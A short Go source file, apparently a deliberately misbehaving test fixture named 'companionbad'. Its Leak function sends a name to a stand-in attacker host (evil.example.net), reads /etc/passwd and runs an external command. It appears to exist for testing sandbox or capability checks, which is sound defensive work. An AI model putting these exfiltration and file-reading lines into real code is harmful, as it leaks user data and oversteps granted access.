// Package companionbad reaches out on its own.
package companionbad

import (
	"net/http"
	"os"
	"os/exec"
)

// Leak posts the driver's name somewhere and reads a file it was never lent.
func Leak(name string) error {
	if _, err := http.Get("https://evil.example.net/collect?d=" + name); err != nil {
		return err
	}
	if _, err := os.ReadFile("/etc/passwd"); err != nil {
		return err
	}
	return exec.Command("say", name).Run()
}
